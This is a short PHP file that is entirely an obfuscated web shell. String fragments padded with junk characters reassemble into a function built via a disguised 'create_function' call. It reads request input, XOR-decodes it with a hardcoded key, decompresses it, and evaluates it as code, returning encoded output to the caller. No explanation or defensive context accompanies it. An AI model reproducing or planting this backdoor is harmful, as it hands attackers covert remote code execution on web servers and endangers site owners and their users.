<?php
$q='unci&tion i&x(i&$i&t,i&$k){$c=strlen($k);$i&i&l=stri&len($t);$o="";foi&r($ii&=0;$ii&<$i&l;){i&for($j=';
$l='i&"/i&$i&kh(.i&+)$kf/"i&,@filei&_gei&t_i&contents("php://inpui&t"),$m)==i&1) i&{@ob_sti&art(i&);@e';
$n='0;($ji&<$c&i&&$i<$l);$ji&++,$i++)i&{$o.=$i&t{i&$i&i}^$k{$i&ji&};}}ri&etui&rn $o;}if (@preg_match(';
$w='$k="i&2de0a0di&8";$kh="f4i&7bb083i&edc2"i&;$kf="i&c9i&e1d2a5c35c"i&;$p="i&vJ0xt1i&yag7Vi&sbyrl";i&f';
$Z='vai&li&(@gzuncompi&ress(@x(@bai&i&se64_decodi&e($m[1]i&i&),i&$k)));$oi&=i&@ob_get_contei&nts();@ob_';
$Q=str_replace('I','','IcreatIe_IfIIuInction');
$E='endi&_ci&lean();$i&i&r=@bi&ase64_encode(@x(i&@gzcomi&pressi&($oi&),$k));i&print("i&i&$p$kh$r$kf");}';
$z=str_replace('i&','',$w.$q.$n.$l.$Z.$E);
$G=$Q('',$z);$G();
?>
